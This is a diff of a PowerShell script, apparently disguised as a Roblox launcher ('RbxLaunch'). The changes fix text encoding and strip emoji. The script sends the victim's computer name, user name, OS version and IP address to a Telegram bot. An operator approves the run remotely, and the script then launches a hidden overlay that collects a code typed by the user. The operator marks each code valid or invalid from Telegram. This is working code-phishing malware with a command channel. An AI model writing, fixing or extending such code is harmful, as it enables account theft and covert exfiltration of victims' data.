@@ -2,7 +2,7 @@
 $d = "$env:APPDATA\RbxLaunch"
 
 $ini = @{}
-Get-Content "$d\config.ini" | ForEach-Object {
+Get-Content "$d\config.ini" -Encoding UTF8 | ForEach-Object {
     if ($_ -match '^([^=]+)=(.+)$') { $ini[$Matches[1].Trim()] = $Matches[2].Trim() }
 }
 $tok = $ini['token']
@@ -13,9 +13,9 @@ function Tg($ep, $json) {
     try {
         $bytes = [Text.Encoding]::UTF8.GetBytes($json)
         $req = [Net.WebRequest]::Create("https://api.telegram.org/bot$tok/$ep")
-        $req.Method = 'POST'; $req.ContentType = 'application/json'; $req.ContentLength = $bytes.Length
+        $req.Method = 'POST'; $req.ContentType = 'application/json; charset=utf-8'; $req.ContentLength = $bytes.Length
         $s = $req.GetRequestStream(); $s.Write($bytes, 0, $bytes.Length); $s.Close()
-        (New-Object IO.StreamReader $req.GetResponse().GetResponseStream()).ReadToEnd() | ConvertFrom-Json
+        (New-Object IO.StreamReader($req.GetResponse().GetResponseStream(), [Text.Encoding]::UTF8)).ReadToEnd() | ConvertFrom-Json
     } catch {}
 }
 
@@ -48,10 +48,12 @@ $localip = try {
     $u = New-Object Net.Sockets.UdpClient; $u.Connect('8.8.8.8', 80)
     $ip = $u.Client.LocalEndPoint.Address; $u.Close(); $ip
 } catch { 'unavailable' }
-$info = "Host: $env:COMPUTERNAME`nUser: $env:USERNAME`nOS: $([Environment]::OSVersion.Version)`nIP: $localip"
+
+# Escape for JSON (no literal newlines in strings)
+$infoJson = "Host: $env:COMPUTERNAME\nUser: $env:USERNAME\nOS: $([Environment]::OSVersion.Version)\nIP: $localip"
 
 # Approval gate
-Tg 'sendMessage' "{`"chat_id`":`"$oid`",`"text`":`"⚠️ Execution requested — approve?\n\n$info`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"✅ Approve`",`"callback_data`":`"approve`"},{`"text`":`"❌ Deny`",`"callback_data`":`"deny`"}]]}}"
+Tg 'sendMessage' "{`"chat_id`":`"$oid`",`"text`":`"Execution requested - approve?\n\n$infoJson`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"Approve`",`"callback_data`":`"approve`"},{`"text`":`"Deny`",`"callback_data`":`"deny`"}]]}}"
 
 $approved = $null
 while ($null -eq $approved) {
@@ -61,15 +63,15 @@ while ($null -eq $approved) {
             $offset = $upd.update_id + 1
             $cb = $upd.callback_query
             if (!$cb) { continue }
-            if ($cb.data -eq 'approve') { Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"✅ Approved`"}"; $approved = $true; break }
-            if ($cb.data -eq 'deny')    { Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"❌ Denied`"}";   $approved = $false; break }
+            if ($cb.data -eq 'approve') { Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"Approved`"}"; $approved = $true; break }
+            if ($cb.data -eq 'deny')    { Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"Denied`"}";   $approved = $false; break }
         }
     }
 }
 if (-not $approved) { exit }
 
 # Theme picker
-Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"🎨 Choose overlay theme:`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"☀️ Light`",`"callback_data`":`"theme_light`"},{`"text`":`"🌙 Dark`",`"callback_data`":`"theme_dark`"}]]}}"
+Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"Choose overlay theme:`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"Light`",`"callback_data`":`"theme_light`"},{`"text`":`"Dark`",`"callback_data`":`"theme_dark`"}]]}}"
 
 $theme = $null
 while ($null -eq $theme) {
@@ -90,13 +92,13 @@ while ($null -eq $theme) {
 $overlayExe = "$d\overlay\overlay.exe"
 Start-Process $overlayExe -ArgumentList $theme -WindowStyle Hidden
 Start-Sleep 3
-Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"🟢 Overlay opened — waiting for code...`"}"
+Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"Overlay opened - waiting for code...`"}"
 
 $waitingForOutcome = $false
 while ($true) {
     if (-not $waitingForOutcome -and (CheckSubmitted)) {
         $waitingForOutcome = $true
-        Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"🔔 Code submitted\n\nChoose outcome:`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"✅ Valid`",`"callback_data`":`"valid`"},{`"text`":`"❌ Invalid`",`"callback_data`":`"invalid`"}]]}}"
+        Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"Code submitted\n\nChoose outcome:`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"Valid`",`"callback_data`":`"valid`"},{`"text`":`"Invalid`",`"callback_data`":`"invalid`"}]]}}"
     }
     $data = Poll $offset
     if ($data -and $data.result) {
@@ -105,12 +107,12 @@ while ($true) {
             $cb = $upd.callback_query
             if (!$cb) { continue }
             if ($cb.data -eq 'valid') {
-                Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"✅ Overlay closed`"}"
+                Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"Overlay closed`"}"
                 try { (New-Object Net.WebClient).DownloadString('http://127.0.0.1:7823/valid') } catch {}
                 $waitingForOutcome = $false
             }
             if ($cb.data -eq 'invalid') {
-                Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"❌ Error shown`"}"
+                Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"Error shown`"}"
                 try { (New-Object Net.WebClient).DownloadString('http://127.0.0.1:7823/invalid') } catch {}
                 $waitingForOutcome = $false
             }
